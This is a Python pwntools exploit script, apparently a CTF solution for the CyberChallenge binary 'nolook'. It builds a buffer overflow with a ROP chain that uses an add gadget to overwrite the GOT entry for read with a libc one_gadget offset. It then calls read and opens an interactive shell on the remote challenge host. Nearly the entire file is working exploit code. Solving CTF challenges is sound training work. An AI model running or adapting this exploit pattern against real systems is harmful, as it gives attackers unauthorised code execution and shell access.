#!/usr/bin/env python3

from pwn import *

exe = ELF("./nolook")
libc = ELF("./libc-2.27.so")
# libc = ELF("./libc6_2.37-0ubuntu2_amd64.so")	# LOCAL
context.binary = exe

PADDING = b'A' * 24
OG_OFFSET = 0x10a38c		# OneGadget Offset inside LIBC (one of the three that works)
# OG_OFFSET = 0x4e8a0		# LOCAL


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.PLT_DEBUG:
			gdb.attach(r)
	else:
		r = remote("nolook.challs.cyberchallenge.it", 9135)

	return r


def main():
	r = conn()
	rop = ROP(exe)

	add_qword_ptr = 0x00000000004005af		# add qword ptr [r14 + 0x90], r15; ret;
	pop_r14_r15   = rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]

	# NOTE: Can't pack negative values so we do this trick to get a negative value but give to 'p64' as an unsigned
	# Observe that (0xFF.FF.FF.FF.FF.FF.FF.FF + 1) gives us 0x1.00.00.00.00.00.00.00.00, a number usable for any subtraction whose result stays inside 8 bytes
	payload =  PADDING + p64(pop_r14_r15) + p64(exe.got['read'] - 0x90) + p64(0xFFFFFFFFFFFFFFFF - libc.symbols['read'] + OG_OFFSET + 1)
	payload += p64(add_qword_ptr) + p64(exe.plt['read'])
	r.sendline(payload)

	'''
	OneGadget inside LIBC:

	0x4f322 execve("/bin/sh", rsp+0x70, environ)
	constraints:
		rsp + 0x70 == NULL
	'''

	r.interactive()


if __name__ == "__main__":
	main()
